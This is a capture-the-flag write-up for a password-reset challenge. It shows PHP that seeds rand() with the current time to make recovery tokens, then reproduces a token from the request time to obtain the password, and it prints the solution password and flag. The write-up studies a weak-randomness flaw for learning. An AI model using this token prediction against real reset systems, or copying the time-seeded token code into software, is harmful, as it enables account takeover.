# Password Reset

__SOLUTION__

Again there's a form. So let's start by checking out the source code.
When you get the source it's an unknow file. Just do `➜ strings 51e157a76ec4a537756e904d586fef41`  and you'll have the source

```php
if(isset($_POST['reset_username'])) {
                srand(time());
                $token = rand(1000000000000000,9999999999999999);

                $hSql->FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR']));
                $hSql->FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));

if(URL_HANDLE::GetInstance()->get->k != null) {
                $result = reset($hSql->FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()->get->k)));

                if($hSql->RowCount() != 0) {
                                if($result->expired_time > time()) {
                                                $success = '<div class="success">Here\'s your new password: XXXXXXXXXXXXXX</div>';
                                } else {
                                                $success = '<div class="error">Expired recovery key!</div>';
                                }
                } else {
                                $success = '<div class="error">Invalid recovery key!</div>';

```

You'll notice that ` if($result->expired_time > time())` So now we need to figure out how's that time coming.
Okay now looking at the code:
```php
if(isset($_POST['reset_username'])) {
                srand(time());
                $token = rand(1000000000000000,9999999999999999);
```

We see that the time we were talking about was used as a seed value for `randomness`. So if we take the time and generate the token with same random parameters we'll get same token.
If you're thinking why? Well because technically random numbers are not random in computers they have a `seed` value to decide a `number` which to us seems random but in reality is not. For more read: https://en.wikipedia.org/wiki/Random_number_generation.

```php
> $seedtime = strtotime('Sun, 09 Dec 2018 04:38:16 -0500');
> srand($seedtime);
> $token = rand(1000000000000000,9999999999999999);
> print $token;
8207905481224538
```

Now we have the token we have to send it: `https://ringzer0ctf.com/challenges/113/?k=8207905481224538` and we'll have the password `Thi%P@s50rD!sM1n3*` then simply login and get the flag.


FLAG - `FLAG-DlwwTV7vCQf4Dn281Yhb802x5U`
